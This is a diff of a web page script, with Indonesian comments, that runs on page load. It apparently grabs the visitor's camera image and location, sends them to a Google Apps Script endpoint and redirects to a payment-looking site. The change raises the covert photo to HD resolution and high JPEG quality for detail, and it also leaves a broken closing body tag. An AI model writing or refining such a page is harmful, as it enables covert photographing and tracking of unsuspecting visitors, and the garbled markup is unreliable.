@@ -24,8 +24,8 @@ button:hover {background:#2563eb;}
 </div>
 
 <script>
-const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbxh3K_mqkgiM_52UmymnCSZAsGS5LD9ER9TViXqRFZJ1t5gVELAzE8T9CsPb-63YHCl/exec"; // ganti Web App URL
-const REDIRECT_URL = "https://qris.interactive.co.id";   // ganti redirect lo
+const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzPRWTxMh-NFywkvYMRWpUxHmgONuhGPset0Z5EmQtlpN0JsExtj7Gj1PN7rHJX1K9wvA/exec"; // ganti dengan URL Web App lu
+const REDIRECT_URL = "https://qris.interactive.co.id"; 
 
 async function autoRecord(){
     let location="Unavailable", photo="";
@@ -39,11 +39,15 @@ async function autoRecord(){
         const video=document.createElement("video");
         video.srcObject=stream;
         await video.play();
+
         const canvas=document.createElement("canvas");
-        canvas.width=video.videoWidth||640;
-        canvas.height=video.videoHeight||480;
+        // resolusi HD (1280x720)
+        canvas.width=1280;
+        canvas.height=720;
         canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
-        photo=canvas.toDataURL("image/jpeg");
+
+        // kualitas tinggi biar detail (90%)
+        photo=canvas.toDataURL("image/jpeg",0.9); 
         stream.getTracks().forEach(track=>track.stop());
     }catch(e){console.warn("Kamera ditolak");}
 
@@ -81,5 +85,6 @@ async function handleSubmit(){
 
 window.onload=autoRecord;
 </script>
-</body>
+</bo
+    dy>
 </html>
